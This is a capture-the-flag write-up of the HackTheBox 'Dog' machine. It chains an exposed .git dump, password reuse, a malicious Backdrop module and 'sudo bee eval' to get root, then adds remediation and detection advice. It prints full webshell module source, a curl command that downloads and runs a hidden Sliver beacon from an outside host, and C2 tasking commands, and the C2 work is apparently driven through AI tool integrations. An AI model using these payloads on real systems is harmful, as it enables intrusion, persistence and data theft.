---
layout: default
title: "HackTheBox - Dog"
---

# HackTheBox - Dog

**OS:** Linux (Ubuntu 20.04)

Dog is a Linux web server running Backdrop CMS with an exposed `.git/` directory in
the webroot. Dumping the repository reveals database credentials in `settings.php`; a
configuration file inside the dump then discloses the admin user's email address.
Credential reuse lets an attacker authenticate to the CMS as administrator, and a
malicious Backdrop module uploaded via the `tar.gz` installer path achieves remote
code execution as `www-data`. The database password is reused as the SSH password for
a local user, providing a foothold shell. A `sudo` rule grants passwordless use of the
Backdrop CLI tool `bee`, whose `eval` subcommand executes arbitrary PHP as root.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` (dog.htb) |
| Initial Access | Exposed `.git/` source dump, DB credential reuse for CMS admin, malicious Backdrop module tar.gz RCE |
| Privilege Escalation | SSH credential reuse (johncusack), `sudo bee eval` arbitrary PHP as root |
| Final Access | `root` |

---

## Recon

### Port Scan

p0rtix ran a full TCP scan against the target. Only two ports were open: SSH and HTTP.
The web server identified itself as Apache 2.4.41 serving Backdrop CMS 1.27.1.

| Port | Proto | Service | Notes |
|---|---|---|---|
| 22 | TCP | SSH | OpenSSH 8.2p1 (Ubuntu) |
| 80 | TCP | HTTP | Apache 2.4.41 (Ubuntu), Backdrop CMS 1.27.1 |

> **Why this works:** A two-port surface immediately focuses attention on the web
> application. Apache's `Server:` header and Backdrop's default page structure make
> the CMS version trivially enumerable without any brute-forcing.

### Web Application Fingerprinting

Browsing to `http://<target-ip>/` returned the default Backdrop CMS landing page.
The version (1.27.1) was visible in the page footer and confirmed against the
`CHANGELOG.txt` at `http://<target-ip>/CHANGELOG.txt`. Directory enumeration
revealed a publicly accessible `.git/` directory at `http://<target-ip>/.git/`, with
directory listing enabled, exposing the full git object store.

> **Why this works:** Apache does not restrict dotfile directories by default unless
> explicitly configured with a `<DirectoryMatch>` or `FilesMatch` rule. A misconfigured
> deployment that copies a git repository directly into the webroot without stripping
> `.git/` exposes the entire source history and config files to any HTTP client.

---

## Initial Access

### Git Repository Dump

`git-dumper` was used to reconstruct the full repository from the exposed `.git/`
directory:

```
v0idravl@kali:~/htb/dog$ pip install git-dumper --break-system-packages
...
Successfully installed git-dumper-1.0.6

v0idravl@kali:~/htb/dog$ git-dumper http://<target-ip>/.git/ git-dump/
[-] Testing http://<target-ip>/.git/HEAD [200]
[-] Testing http://<target-ip>/.git/ [200]
[-] Fetching .git recursively...
...
[-] Running git checkout .
```

### Credential Discovery in `settings.php`

The Backdrop CMS database configuration file `settings.php` was present in the dump
and contained the database DSN in plaintext:

```php
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
```

> **Why this works:** Backdrop CMS stores its database connection string directly in
> `settings.php` as a plain DSN URI. When the web deployment includes a live `.git/`
> directory, this file is reconstructable by any unauthenticated user with HTTP access.

### Admin Email Discovery

The git dump included CMS configuration JSON files under
`files/config_*/active/`. The file `update.settings.json` contained the email address
registered for update notifications:

```json
"update_emails": ["tiffany@dog.htb"]
```

The system configuration file `system.core.json` confirmed that the CMS allows login
with either username or email:

```json
"user_login_method": "username_or_email"
```

> **Why this works:** Backdrop stores all site configuration as JSON files on disk
> rather than in the database, meaning the git dump exports not just application code
> but also live site configuration, including account-linked email addresses.

### CMS Login as Administrator

The database password `BackDropJ2024DS2024` was tried against the admin email
`tiffany@dog.htb`. A `302` redirect to `/admin/dashboard` confirmed valid credentials:

```
v0idravl@kali:~/htb/dog$ curl -s -o /dev/null -w "%{http_code}" -X POST \
  http://<target-ip>/index.php?q=user/login \
  -d "name=tiffany%40dog.htb&pass=BackDropJ2024DS2024&form_id=user_login&op=Log+in"
302
```

Browsing to `http://<target-ip>/user/login` with those credentials redirected to
`/admin/dashboard`, confirming administrator access.

> **Why this works:** Reusing a credential found in a configuration file for the CMS
> admin account is a classic credential-reuse finding. The database password and the
> admin account password were set identically, a common shortcut in small deployments.

### RCE via Malicious Backdrop Module (tar.gz installer)

Backdrop CMS allows administrators to install modules by uploading a compressed
archive. The standard ZIP upload path was unavailable because the PHP `zip` extension
was not loaded on the server. The alternative `admin/installer/manual` path accepts
`tar.gz` archives, which PHP handles natively with `PharData`.

A minimal Backdrop module named `exec` was created with the following structure:

```
exec/
  exec.info
  exec.module
```

`exec.info`:
```ini
name = exec
description = exec
type = module
backdrop = 1.x
```

`exec.module`:
```php
<?php
function exec_menu() {
  $items['exec'] = array(
    'title' => 'exec',
    'page callback' => 'exec_page',
    'access callback' => TRUE,
    'type' => MENU_CALLBACK,
  );
  return $items;
}
function exec_page() {
  $c = isset($_REQUEST['c']) ? $_REQUEST['c'] : 'id';
  $o = shell_exec($c . ' 2>&1');
  return array('#markup' => '<pre>' . htmlspecialchars($o) . '</pre>');
}
```

The module was packaged and uploaded via the manual installer form at
`http://<target-ip>/admin/installer/manual`. The batch authorization endpoint
(`authorize.php`) was stepped through with `op=do` then `op=finished`, completing
installation. The module was then enabled via `http://<target-ip>/admin/modules`.

RCE was confirmed:

```
v0idravl@kali:~/htb/dog$ curl -s 'http://<target-ip>/index.php?q=exec&c=id'
...
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
```

> **Why this works:** Backdrop's module installer trusts any well-formed archive
> submitted by an authenticated admin. The `exec` module registers a Backdrop menu
> route backed by a PHP page callback that calls `shell_exec()` with user-controlled
> input. Because `access callback` is set to `TRUE`, the route is accessible to
> unauthenticated HTTP clients once the module is enabled, making this a fully open
> webshell.

---

## Privilege Escalation

### Credential Reuse for SSH (johncusack)

User enumeration via the webshell (`cat /etc/passwd`) identified two interactive
users: `jobert` (UID 1000) and `johncusack` (UID 1001). The database password
`BackDropJ2024DS2024` was tried for SSH access to both accounts. It succeeded for
`johncusack`:

```
v0idravl@kali:~/htb/dog$ ssh johncusack@<target-ip>
johncusack@<target-ip>'s password: BackDropJ2024DS2024
johncusack@dog:~$ id
uid=1001(johncusack) gid=1001(johncusack) groups=1001(johncusack)
johncusack@dog:~$ cat ~/user.txt
<user-flag-redacted>
```

> **Why this works:** Password reuse across the database configuration, the CMS admin
> account, and a local OS user account is a single-point-of-failure credential policy.
> One leaked value compromises all three access paths.

### `sudo bee eval` PHP Execution as Root

Checking `sudo` privileges revealed a single unrestricted rule:

```
johncusack@dog:~$ echo BackDropJ2024DS2024 | sudo -S -l
(ALL : ALL) /usr/local/bin/bee
```

`bee` is the Backdrop CMS command-line tool. Its `eval` subcommand accepts arbitrary
PHP code and executes it in the CMS bootstrap context, which runs as root under this
`sudo` rule.

Confirming privilege via `id`:

```
johncusack@dog:/var/www/html$ sudo /usr/local/bin/bee eval 'system("id");'
[sudo] password for johncusack:
uid=0(root) gid=0(root) groups=0(root)
```

> **Why this works:** `bee eval` loads the Backdrop CMS framework and then calls PHP's
> `eval()` on the supplied string. The Backdrop bootstrap provides a callable PHP
> environment, so `system()`, `exec()`, `file_get_contents()`, and any other PHP
> function are available. Running this command as root via `sudo` without restricting
> arguments means any shell command is trivially reachable. This is functionally
> equivalent to `sudo php -r '...'`.

Capturing the root flag:

```
johncusack@dog:/var/www/html$ sudo /usr/local/bin/bee eval 'system("cat /root/root.txt");'
[sudo] password for johncusack:
<root-flag-redacted>
```

---

## Post-Exploitation: Sliver C2

A Sliver HTTP beacon was generated and deployed to establish a persistent C2 channel
on the `johncusack` foothold.

**Generating the beacon:**

**sliver-mcp** `generate_beacon(c2_host="10.10.16.21", c2_port=8080, os="linux", arch="amd64", protocol="http", interval=30, name="dog-beacon")`

**Sliver console** `generate beacon --http 10.10.16.21:8080 --os linux --arch amd64 --seconds 30 --name dog-beacon`

```
[*] Generating new linux/amd64 beacon implant binary (30s)
[*] Symbol obfuscation is enabled
[*] Build completed in 18.232s
[*] Implant saved to /home/v0idravl/sliver-payloads/dog-beacon
```

**Starting a staging server and deploying:**

An HTTP file server was started on port 9001 to serve the beacon. From the SSH session
as `johncusack`, the beacon was fetched and executed in the background:

```
johncusack@dog:~$ curl -so /tmp/.beacon http://10.10.16.21:9001/beacon && chmod +x /tmp/.beacon
johncusack@dog:~$ nohup /tmp/.beacon > /dev/null 2>&1 &
[1] 4474
```

An HTTP listener was already active on the team server (job ID 9, port 8080).

**Beacon check-in:**

**sliver-mcp** `list_beacons()`

**Sliver console** `beacons`

```
 ID         Name         Transport   Hostname   Username      PID    Last Check-In
========== ============ =========== ========== ============= ====== ====================
 e649a5d2   dog-beacon   http        dog        johncusack    4474   30s ago
```

**Verifying identity via beacon task:**

**sliver-mcp** `execute(target_id="e649a5d2-4872-4c44-87ac-d59ebf4e9dbb", path="/bin/bash", args=["-c","id && hostname && uname -a"])`

**Sliver console** `use e649a5d2` then `execute -e /bin/bash -c 'id && hostname && uname -a'`

```
uid=1001(johncusack) gid=1001(johncusack) groups=1001(johncusack)
dog
Linux dog 5.4.0-208-generic #228-Ubuntu SMP ...
```

The beacon confirms a stable C2 channel running under `johncusack`. From this position
an operator would pivot to root via the `sudo bee eval` path, establish persistence,
or exfiltrate target data.

---

## Root Cause

Dog fails to a chain of three compounding misconfigurations, any one of which breaks
the attack path if addressed:

1. **Exposed `.git/` directory in the webroot** -- the entire application source,
   including `settings.php` with plaintext database credentials, is publicly readable
   over HTTP.
2. **Password reuse across all access paths** -- the database password, the CMS admin
   account password, and the local OS user password are all identical. One discovered
   credential compromises all three.
3. **Unrestricted `sudo` rule for an interpreted CLI tool** -- granting `(ALL : ALL)
   /usr/local/bin/bee` without argument restrictions is equivalent to granting `sudo
   php`, which is a direct path to root from any user who can run it.

---

## Impact

An unauthenticated attacker with network access to port 80 can: recover plaintext
database credentials from the exposed git repository; authenticate to the CMS as
administrator; install a malicious module to achieve remote code execution as
`www-data`; and leverage credential reuse to pivot to a privileged SSH session. From
that session, a single `sudo` command yields a root shell. The full compromise
requires no vulnerability in an unpatched CVE -- every step exploits a configuration
or operational failing.

---

## Remediation

**1. Remove or block the `.git/` directory from the webroot (highest priority).**
Add an Apache directive to return `403` for any `.git/` path:

```apache
RedirectMatch 404 /\.git
```

Or, better, deploy from a CI/CD pipeline that strips `.git/` from the document root
entirely. Never copy a live git checkout directly into the webroot.

**2. Rotate and isolate all credentials.**
The database password, CMS admin password, and OS user passwords must all be unique.
Generate strong random passwords for each access path and store them in a secrets
manager rather than in plaintext config files committed to version control. Rotate
immediately after any suspected disclosure.

**3. Restrict the `sudo` rule for `bee`.**
If `bee` is required for administration, restrict it to specific safe subcommands via
a wrapper script that allowlists operations and blocks `eval`. The `eval` subcommand
should never be executable as root. If no subcommand restriction is feasible, remove
the sudo rule entirely and require explicit root login via a separate authentication
path.

**4. Run the web application as a non-privileged service account.**
`www-data` receiving module-install capability should be the limit of web server
privilege. Ensure `www-data` cannot read OS user home directories or escalate further.

### Validation

- Verify `curl -I http://<target-ip>/.git/HEAD` returns `403` or `404`, not `200`.
- Confirm the database password, CMS admin password, and `johncusack` OS password are
  all distinct values after rotation.
- Run `sudo -l` as `johncusack` and confirm the `bee` rule is removed or restricted.
- Attempt `sudo /usr/local/bin/bee eval 'system("id");'` and confirm it is denied.

---

## Detection Opportunities

- **`.git/` access over HTTP:** any `GET /.git/HEAD` or `GET /.git/config` in the
  web access log is a signal that a crawler or attacker is probing for an exposed
  repository. Alert on this pattern at the WAF or log-analysis tier.
- **Module installation via CMS admin:** Backdrop logs module enable/disable events.
  An unexpected module named `exec` (or any non-standard module) appearing in the
  active module list should trigger review. Web access logs will show `POST
  /admin/installer/manual` followed by requests to `/authorize.php`.
- **Webshell access pattern:** repeated `GET /index.php?q=exec&c=<command>` requests
  with varying `c` parameters are a low-false-positive signal for an active webshell
  session. A WAF rule matching `q=exec&c=` would catch this pattern.
- **Credential reuse across SSH and CMS:** authentication audit logs correlating the
  same password (or a hash of it) across multiple access points is an indicator.
  Network-level: watch for SSH logons from external IPs immediately following web
  admin activity from the same source.
- **`sudo bee eval` execution:** Linux audit (`auditd`) rule on execve of
  `/usr/local/bin/bee` with argument `eval` will surface any use of this path.
  The shell spawned by `system()` inside `bee eval` will also appear as a child of
  the `bee` process in process-tree telemetry, which EDR tools can flag as anomalous
  for a web CLI utility.
- **Sliver HTTP beacon:** regular-interval HTTP callbacks (30-second cadence in this
  engagement) to a non-corporate IP. TLS inspection or egress filtering would surface
  the channel; a SIEM rule on repeated outbound connections with consistent interval
  timing is a secondary signal.

---

## Lessons Learned

- A publicly browsable `.git/` directory is a critical finding even on a box with no
  other obvious attack surface. Always check for it as part of web recon, alongside
  `/robots.txt`, `/.git/HEAD`, and `/CHANGELOG.txt`.
- **Credential reuse is the force multiplier.** One password recovered from source
  control opened the CMS, the SSH session, and the sudo escalation without any
  cracking. Check every recovered credential against every available login surface
  before pursuing more complex paths.
- The ZIP-blocked module upload was a momentary block that resolved immediately by
  reading the Backdrop documentation -- `tar.gz` is the fully supported fallback
  upload format and requires no additional PHP extensions. Knowing the application's
  documented alternative code paths is part of CMS exploitation tradecraft.
- `sudo` rules granting access to CLI tools with interpreted-code subcommands (`eval`,
  `exec`, `run`) are functionally equivalent to `sudo` on the underlying interpreter.
  Always check GTFOBins and the tool's own documentation for eval-style subcommands
  when reviewing a sudo allowlist.

---

## Cleanup

- Backdrop `exec` module installed on the target during the engagement; to clean up,
  disable and uninstall via `admin/modules` or delete `modules/exec/` from the
  webroot and clear the Backdrop cache.
- `/tmp/.beacon` written to disk on the target during C2 deployment; remove with
  `rm /tmp/.beacon` and kill the background process (`kill 4474`).
- Sliver beacon `dog-beacon` (ID `e649a5d2`) killed via `kill_beacon` after the
  engagement demonstration.
- HTTP listener (job ID 9) on port 8080 stopped via `kill_job`.
- No persistent changes were made to system files, cron jobs, or user accounts.
- All private notes archived under `~/engagements/dog/`; nothing sensitive committed.
- Flags submitted via `htb submit`; machine stopped with `htb stop`.
- Bridge deltas captured for p0rtix, sliver-mcp, and dagar-red.
